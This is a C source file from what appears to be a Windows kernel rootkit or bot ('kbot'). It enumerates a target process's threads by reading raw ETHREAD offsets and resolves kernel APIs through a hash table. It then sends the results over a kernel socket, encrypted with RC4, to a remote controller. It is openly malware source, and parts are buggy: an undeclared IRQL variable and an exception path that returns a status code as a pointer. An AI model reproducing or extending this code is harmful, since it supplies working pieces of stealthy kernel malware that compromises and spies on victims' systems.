#include "common.h"

/*//////////////////////////////////////////
//
//	File: Thread.c
//
//	Thread information by process ID
//	gathers information directly from ETHREAD
//
*///////////////////////////////////////////


PROOTKIT_PROCESS_LIST_HEAD kernel_get_process_threads(IN UINT32 ProcessId, IN PROOTKIT_API_HASH Hash)
{
	PLIST_ENTRY ListBegin = NULL;
	PLIST_ENTRY ListEntry = NULL;
	PROOTKIT_THREAD_ENTRY ThreadBuffer = NULL;
	PEPROCESS Eprocess = NULL;
	ULONG_PTR Ethread = 0;
	NTSTATUS st;
	TIME_FIELDS ttimer = { 0 };
	LARGE_INTEGER large = { 0 };

	st = Hash->_PsLookupProcessByProcessId((HANDLE)ProcessId, (PEPROCESS*)&Eprocess);
	if (!NT_SUCCESS(st))
	{
		KdPrint(("\r\nError opening process handle"));
		Hash->_ObfDereferenceObject(Eprocess);
	}

	__try {

		g_thread_head = (PROOTKIT_THREAD_LIST_HEAD)Hash->_ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_THREAD_LIST_HEAD));
		InitializeListHead(&g_thread_head->Entry);
		g_thread_head->NumberOfThreads = 0;

		ListBegin = (PLIST_ENTRY)((ULONG_PTR)Eprocess + g_rootkit_dynamic_data.ThreadListHead_Offset);

		for (ListEntry = ListBegin->Flink; ListEntry != ListBegin; ListEntry = ListEntry->Flink)
		{
			ThreadBuffer = (PROOTKIT_THREAD_ENTRY)Hash->_ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_THREAD_ENTRY));
			Ethread = (ULONG_PTR)ListEntry - g_rootkit_dynamic_data.ThreadListEntry_Offset;
			memset(ThreadBuffer, 0, sizeof(ROOTKIT_THREAD_ENTRY));

			ThreadBuffer->Ethread = Ethread;
			ThreadBuffer->ThreadId = Hash->_PsGetThreadId(Ethread);
			ThreadBuffer->ContextSwitches = *(PUINT16)(Ethread + g_rootkit_dynamic_data.ContextSwitches_Offset);
			ThreadBuffer->StartAddress = *(PULONG_PTR)((ULONG_PTR)Ethread + g_rootkit_dynamic_data.StartAddress_Offset);
			ThreadBuffer->KernelStackResident = *(PBOOLEAN)(Ethread + g_rootkit_dynamic_data.KernelStackResident_Offset);

			large = *(LARGE_INTEGER*)((ULONG_PTR)Ethread + g_rootkit_dynamic_data.CreateTimeThread_Offset);
			Hash->_RtlTimeToTimeFields(&large, &ttimer);

			ThreadBuffer->KernelTime = *(PUINT32)((ULONG_PTR)Ethread + g_rootkit_dynamic_data.ThreadKernelTime_Offset);

			Hash->_sprintf_s(ThreadBuffer->ThreadCreationTime, 255, "%02u/%02u/%04u %02u:%02u:%02u", \
				ttimer.Day, \
				ttimer.Month, \
				ttimer.Year, \
				ttimer.Hour, \
				ttimer.Minute, \
				ttimer.Second);

			g_thread_head->NumberOfThreads++;

			Hash->_KfAcquireSpinLock(&g_globalspinlock);
			InsertTailList(&g_thread_head->Entry, &ThreadBuffer->Entry);
			Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);
		}

		return g_thread_head;

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		KdPrint(("\r\nException Caught Thread plugin"));
		if (g_thread_head) {
			Hash->_ExFreePoolWithTag(g_thread_head,0);
			g_thread_head = NULL;
		}
		return GetExceptionCode();
	}

	Hash->_ObfDereferenceObject(Eprocess);
}

ULONG rk_copy_thread_list_to_buffer(PROOTKIT_THREAD_ENTRY Buffer, IN PROOTKIT_API_HASH Hash)
{
	ULONG returnedlength = 0;
	PROOTKIT_THREAD_ENTRY CopyBuffer = NULL;

	if (g_thread_head == NULL)
		return 0;

	Hash->_KfAcquireSpinLock(&g_globalspinlock);

	while (!IsListEmpty(&g_thread_head->Entry))
	{
		CopyBuffer = (PROOTKIT_THREAD_ENTRY)RemoveTailList(&g_thread_head->Entry);
		kimemcpy(Buffer, CopyBuffer, sizeof(ROOTKIT_THREAD_ENTRY));
		Hash->_ExFreePoolWithTag(CopyBuffer,0);
		Buffer++;
		returnedlength++;
	}

	Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);

	Hash->_ExFreePoolWithTag(g_thread_head,0);
	g_thread_head = NULL;

	return returnedlength*sizeof(ROOTKIT_THREAD_ENTRY);
}

BOOLEAN rk_send_threads_to_userspace(IN UINT32 ProcessId, IN PFILE_OBJECT socket, IN PROOTKIT_API_HASH Hash)
{
	ULONG sendbytes = 0;
	PROOTKIT_THREAD_LIST_HEAD threadlisthead = NULL;
	PROOTKIT_THREAD_ENTRY entrythread = NULL;
	INT sendsize = 0;
	ULONG returnedbytes = 0;
	PVOID Buffer = NULL;
	PMDL Mdl = NULL;
	BOOLEAN g_cond = FALSE;

	threadlisthead = kernel_get_process_threads(ProcessId, Hash);
	sendbytes = threadlisthead->NumberOfThreads*sizeof(ROOTKIT_THREAD_ENTRY);

	do
	{
		sendsize = send(socket, (char*)&sendbytes, sizeof(ULONG));
		if (sendsize > 0)
		{
			Buffer = KiAllocateMappedVirtualMemory(sendbytes, 'kbot', &Mdl, Hash);
			if (Buffer && Hash->_MmIsAddressValid(Buffer) && KiIsMdlAdddressValid(Mdl,Hash)==TRUE)
			{
				entrythread = (PROOTKIT_THREAD_ENTRY)Buffer;
				if (entrythread && Hash->_MmIsAddressValid(entrythread))
				{
					returnedbytes = rk_copy_thread_list_to_buffer(entrythread, Hash);
					if (returnedbytes > 0)
					{
						sendsize = tdi_send_crypted(socket, RC4_KEY_2, (PROOTKIT_THREAD_ENTRY)entrythread, returnedbytes, 0);
						if (sendsize > 0)
						{
							g_cond = TRUE;
							goto clean;
						}
					}
				}
			}
		}


	} while (FALSE);

clean:
	KiFreeMappedVirtualMemory(Buffer, 'kbot', Mdl, Hash);
	Buffer = NULL;

	return g_cond;
}